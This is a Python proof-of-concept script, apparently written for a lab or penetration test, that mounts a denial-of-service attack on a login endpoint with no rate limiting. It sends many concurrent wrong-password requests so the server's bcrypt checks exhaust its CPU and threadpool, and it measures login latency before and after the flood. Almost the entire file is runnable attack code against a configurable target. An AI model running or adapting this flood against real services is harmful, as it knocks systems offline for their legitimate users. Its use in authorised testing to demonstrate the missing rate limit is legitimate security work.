#!/usr/bin/env python3
"""DoS Layer 2 - bcrypt login flare (resource exhaustion).

There is no rate limiting on /api/login, and every check runs bcrypt
(cost 10, ~50-100 ms of CPU). N concurrent attackers queue enough bcrypt
work to saturate the CPU and libuv threadpool, degrading the service.

Usage:
    python3 login_flood.py [base_url] [threads] [seconds]
    python3 login_flood.py http://192.168.56.1:3000 60 20
"""
import sys
import threading
import time

import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.56.1:3000"
THREADS = int(sys.argv[2]) if len(sys.argv) > 2 else 60
SECONDS = int(sys.argv[3]) if len(sys.argv) > 3 else 20

ok = 0
err = 0
lock = threading.Lock()
deadline = time.time() + SECONDS


def probe():
    t0 = time.time()
    try:
        r = requests.post(BASE + "/api/login",
                          json={"username": "thant", "password": "wrong"},
                          timeout=8)
        return "HTTP %d" % r.status_code, round(time.time() - t0, 3)
    except requests.exceptions.RequestException:
        return "TIMEOUT", round(time.time() - t0, 3)


print("== pre-flood baseline: one login takes", probe())

def hit():
    global ok, err
    while time.time() < deadline:
        try:
            requests.post(BASE + "/api/login",
                          json={"username": "thant", "password": "wrong"},
                          timeout=8)
            with lock:
                ok += 1
        except Exception:
            with lock:
                err += 1


print("[start] %d threads hammering /api/login for %ds" % (THREADS, SECONDS))
t0 = time.time()
ts = [threading.Thread(target=hit) for _ in range(THREADS)]
for t in ts:
    t.start()
for t in ts:
    t.join()
print("[done] %ds elapsed: ok=%d  err/queued=%d" % (round(time.time() - t0), ok, err))
print("[post-flood] one login now takes", probe(), "<-- expect a big slowdown")
print()
print(">> Evidence: `top` CPU spike; login latency explodes while /api/skins")
print(">> (no bcrypt) still answers. Single-thread req latency is the story.")